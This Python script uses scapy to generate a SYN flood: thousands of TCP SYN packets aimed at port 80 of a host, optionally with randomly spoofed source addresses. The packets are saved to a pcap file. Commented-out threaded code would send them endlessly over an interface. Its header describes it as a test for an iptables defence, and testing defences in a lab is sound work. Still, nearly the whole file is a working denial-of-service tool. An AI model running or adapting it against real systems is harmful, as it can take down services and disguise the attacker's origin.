#! /usr/bin/env python
# Name : Subodh Pachghare
# CyberSpace Name : HaX0R (Cyberninja)
# Website : www.thesubodh.com
# Description : SYN Flood Packet creation for iptables prevention solution

import sys
from scapy.all import *
import threading
import os
import socket
import random
import getopt

MAX_TCP_SIZE = 65536

class ThreadClass(threading.Thread):
  def __init__(self, p):
    super(ThreadClass, self).__init__() 
    self.p = p

  def run(self):
    while True:
        sendp(self.p, iface="eth0", loop=True)

def get_random_ip():
    ip = ".".join([str(random.randint(0, 255)) for i in range(4)])
    return ip

if __name__ == "__main__":
    MAX_PAYLOAD_SIZE = 1460
    source = ''
    payload_size = MAX_PAYLOAD_SIZE
    random_source = False
    maximum_payload = False
    num_packets = 5000
    output_file = "packets.out.pcap"

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hs:p:rmn:o:", ["source=",  "payload-size=", "random-source", "maximum-payload", "num-packets=", "output-file="])
    except getopt.GetoptError:
        print 'generate.py -s <source host> -p <payload-size> -n <num-packets> -o <output file name>' 
        sys.exit(2)

    for opt, arg in opts:
        if opt == "-h":
            print 'generate.py -s <source host> -p <payload-size> -n <num-packets> -o <output file name>' 
            sys.exit()
        elif opt in ("-s", "--source"):
            source = arg
        elif opt in ("-p", "--payload-size"):
            payload_size = int(arg)
        elif opt in ("-r", "--random-source"):
            random_source = True
        elif opt in ("-m", "--maximum-payload"):
            maximum_payload = True
            payload_size = MAX_PAYLOAD_SIZE
        elif opt in ("-n", "--num-packets"):
            num_packets = int(arg)
        elif opt in ("-o", "--output-file"):
            output_file = arg


    if payload_size not in (0, 1, 2):
        print "generating payload"
        payload = "\x00" + os.urandom(payload_size - 2) + "\x00"
        print "done generating payload"
    elif payload_size == 2:
        payload = "\x00\x00"
    elif payload_size == 1:
        payload = "\x00"
    else:
        payload = ""

    dest_host = 'server'

    print "sending flood to destination " + dest_host
    dest_ip = socket.gethostbyname(dest_host)
    print "this is IP " + dest_ip

    if random_source:
        print "using random source ips"
    else:
        print "using source " + source
        src_ip = socket.gethostbyname("client1")
        print "this is ip " + src_ip

    #conf.verb=0
    print "generating random packets... (this may take a while)"
    if random_source:
        p = [Ether()/IP(src=get_random_ip(), dst=dest_ip, id=1111, ttl=99)/TCP(sport=RandShort(), dport=80, seq=RandShort(), ack=RandShort(), window=1000, flags="S")/payload for i in range(num_packets)]
    else:
        p = [Ether()/IP(src=src_ip, dst=dest_ip, id=1111, ttl=99)/TCP(sport=RandShort(), dport=80, seq=RandShort(), ack=RandShort(), window=1000, flags="S")/payload for i in range(num_packets)]
    #ls(p)
    print "generating pcap file... (this may also take a while)"
    wrpcap(output_file, p)
    #sendpfast(p * 1000, iface="eth0", pps=25000, loop=True)
    #print "starting %d threads" % n
    #for i in range(n):
    #   print "starting thread %d" % i
    #   ThreadClass(p).start()

    #i = 0
    #while True:
    #  print "starting thread %d" % i
    #  i += 1
    #  ThreadClass(p).start()
